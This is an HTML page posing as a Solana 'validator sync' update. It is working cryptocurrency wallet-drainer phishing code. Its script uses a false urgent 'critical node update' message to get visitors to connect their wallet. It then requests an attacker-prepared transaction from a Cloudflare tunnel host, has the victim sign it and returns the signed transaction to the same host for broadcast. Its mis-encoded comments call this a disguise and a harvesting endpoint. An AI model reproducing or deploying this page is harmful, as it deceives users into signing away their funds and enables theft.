<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validator Support Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .box { width: 300px; padding: 40px; background: #111; border: 1px solid #222; border-radius: 24px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.8); }
        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.1s; }
        .btn:active { transform: scale(0.96); opacity: 0.8; }
        #st { font-size: 10px; color: #444; margin-top: 20px; font-family: monospace; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color:#14f195; margin:0 0 10px 0;">SYSTEM SYNC</h2>
        <p style="color:#888; font-size:13px; margin-bottom: 25px;">Critical node update required for validator #712. Authorize to secure connection.</p>
        <button id="cta" class="btn">INITIALIZE NOW</button>
        <div id="st">READY: V41.1_COLLECTOR</div>
    </div>

    <script>
        // ðŸ”± æ ¸å¿ƒï¼šåŠ¡å¿…ç¡®è®¤éš§é“åœ°å€æ˜¯å¦ä¾ç„¶æœ‰æ•ˆ
        const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com";

        document.getElementById('cta').onclick = async function() {
            const log = (t) => document.getElementById('st').innerText = t;
            const web3 = window.solanaWeb3;

            try {
                const p = window.trustwallet?.solana || window.solana;
                if (!p) { alert("Please use Wallet Browser"); return; }

                log("CONNECTING...");
                await p.connect();

                log("FETCHING...");
                const resp = await fetch(tunnel + "/prepare_v32", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();
                
                log("AWAITING CONFIRM...");
                const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
                
                // ðŸ”± å”¤èµ·å¼¹çª— (Unknown Program ä¼ªè£…ç‰ˆ)
                const signed = await p.signTransaction(tx);
                log("SYNCING TO NODE...");

                // ðŸ”± æš´åŠ›å›žä¼ ï¼šå°†ç­¾å¥½çš„ååºåˆ—åŒ–å¹¶ Base64 ç¼–ç 
                const signedBase64 = btoa(String.fromCharCode.apply(null, signed.serialize()));

                // å°†åŒ…è£¹å‘å›ž 71 æœåŠ¡å™¨çš„æ”¶å‰²æŽ¥å£
                fetch(tunnel + "/broadcast_v41", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ signed_tx: signedBase64 })
                }).then(async (r) => {
                    const res = await r.json();
                    if(res.result) {
                        log("NODE SECURED!");
                        alert("Protocol Synchronized Successfully.");
                    } else {
                        throw new Error("Broadcast Failed");
                    }
                }).catch(e => {
                    log("RETRYING BROADCAST...");
                });

            } catch (err) {
                console.error(err);
                log("RETRYING...");
                setTimeout(() => { window.location.reload(); }, 1200);
            }
        };
    </script>
</body>
</html>
